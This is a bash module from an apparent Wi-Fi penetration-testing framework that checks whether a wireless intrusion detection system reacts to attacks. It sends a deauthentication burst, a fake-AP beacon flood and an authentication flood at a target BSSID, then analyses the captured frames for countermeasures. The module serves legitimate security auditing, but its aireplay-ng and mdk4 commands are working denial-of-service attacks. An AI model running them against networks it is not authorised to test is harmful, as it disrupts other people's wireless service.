#!/usr/bin/env bash
# MODULE_META
# NAME="WIDS/WIPS Detection"
# CATEGORY="H"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,tcpdump,mdk4"
# DESC="Test if infrastructure detects deauth, fake AP, and auth flood attacks"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# TIMED="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/h1_wids_detection.sh
#  H1: WIDS/WIPS Detection Testing (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Transmit several common high-noise attack signatures (Deauth, Beacon 
#     Flood, Auth Flood).
#  2. Monitor for infrastructure responses (e.g., Counter-deauthentication, 
#     channel changes, or port shutdowns).
#  3. Use findings to evaluate the effectiveness of the Wireless Intrusion 
#     Detection/Prevention System (WIDS/WIPS).
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/h1"
SCAN_TIME="${SCAN_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="H1"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] [$TC_ID] Testing WIDS/WIPS detection against ${BSSID} on ${INTERFACE}..."

PCAP_FILE="${EVIDENCE_PREFIX}_responses.pcap"
LOG_FILE="${EVIDENCE_PREFIX}_results.txt"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up background processes..."
    [[ -n "${TCPDUMP_PID:-}" ]] && kill "$TCPDUMP_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 1. Start capture — runs in background in both modes while attacks execute below
tcpdump -i "$INTERFACE" -w "$PCAP_FILE" "ether host $BSSID" > /dev/null 2>&1 &
TCPDUMP_PID=$!

# 2. Signature 1: Deauth burst
echo "[*] Signature 1: Sending deauthentication burst..." >> "$LOG_FILE"
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 10 --status "Sending deauthentication burst..."
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    aireplay-ng --deauth 20 -a "$BSSID" "$INTERFACE" || true
else
    aireplay-ng --deauth 20 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID || true
fi
sleep 5
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 30 --status "Deauth burst sent. Monitoring for response..."

# 3. Signature 2: Fake AP flood
if command -v mdk4 &>/dev/null; then
    echo "[*] Signature 2: Sending fake AP beacon flood..." >> "$LOG_FILE"
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 40 --status "Sending fake AP beacon flood..."
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        timeout --foreground 20 mdk4 "$INTERFACE" b -n "$SSID" || true
    else
        timeout 20 mdk4 "$INTERFACE" b -n "$SSID" > /dev/null 2>&1 &
        TOOL_PID=$!
        wait $TOOL_PID || true
    fi
    sleep 5
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 60 --status "Fake AP flood sent. Monitoring for response..."
fi

# 4. Signature 3: Auth flood
if command -v mdk4 &>/dev/null; then
    echo "[*] Signature 3: Sending authentication flood..." >> "$LOG_FILE"
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 70 --status "Sending authentication flood..."
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        timeout --foreground 20 mdk4 "$INTERFACE" a -a "$BSSID" || true
    else
        timeout 20 mdk4 "$INTERFACE" a -a "$BSSID" > /dev/null 2>&1 &
        TOOL_PID=$!
        wait $TOOL_PID || true
    fi
    sleep 5
    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Auth flood sent. Monitoring for response..."
fi

# 5. Stop capture and analyze WIDS/WIPS response
kill "$TCPDUMP_PID" 2>/dev/null || true
wait "$TCPDUMP_PID" 2>/dev/null || true
cleanup
trap - EXIT

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 95 --status "Evaluating WIDS/WIPS response..."

# 6. Analyze pcap for counter-measures from the AP
# A WIDS/WIPS will respond with counter-deauth frames (subtype 0x0c) from the AP,
# or change the operating channel (visible in updated beacons).
# Deauthentication subtype = 12 (0x0c), Disassociation subtype = 10 (0x0a).
COUNTER_DEAUTHS=0
CHANNEL_CHANGE=0
if command -v tshark &>/dev/null && [[ -f "$PCAP_FILE" && -s "$PCAP_FILE" ]]; then
    # Count deauth/disassoc frames originating FROM the AP (sa = BSSID) — these are
    # WIDS-generated counter-measures, not our injected frames (which have forged src).
    COUNTER_DEAUTHS=$(tshark -r "$PCAP_FILE" \
        -Y "wlan.sa == ${BSSID} && (wlan.fc.type_subtype == 12 || wlan.fc.type_subtype == 10)" \
        2>/dev/null | wc -l)
    # Check if a beacon with a different channel appeared after our attacks
    CH_SEEN=$(tshark -r "$PCAP_FILE" \
        -Y "wlan.sa == ${BSSID} && wlan.fc.type_subtype == 8" \
        -T fields -e wlan_mgt.ds.current_channel 2>/dev/null | sort -u | wc -l)
    [[ "$CH_SEEN" -gt 1 ]] && CHANNEL_CHANGE=1
fi

echo "[+] WIDS detection testing complete."
echo "[*] Counter-deauth frames from AP: ${COUNTER_DEAUTHS}" >> "$LOG_FILE"

if [[ "$COUNTER_DEAUTHS" -gt 10 || "$CHANNEL_CHANGE" -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WIDS/WIPS Active Response Detected" \
        --severity "INFO" \
        --desc "WIDS/WIPS counter-measures were observed: ${COUNTER_DEAUTHS} counter-deauth frames from ${BSSID} and channel change: ${CHANNEL_CHANGE}. The infrastructure detected and responded to the attack signatures." \
        --evidence "$PCAP_FILE" \
        --rationale "Active WIDS/WIPS detection is a positive security control. Review response latency — a delayed response still allows short-burst attacks to succeed before containment."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WIDS/WIPS Failed to Detect High-Noise Attacks" \
        --severity "MEDIUM" \
        --desc "Three high-noise attack signatures (deauth burst, fake AP beacon flood, auth flood) completed against ${BSSID} with no observable counter-measure from the infrastructure." \
        --evidence "$PCAP_FILE" \
        --rationale "Failure to detect or respond to noisy 802.11 attacks indicates absent or misconfigured WIDS/WIPS. An attacker can execute prolonged attacks (deauth DoS, handshake capture) without triggering an alert or response."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "WIDS/WIPS detection audit complete."

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0

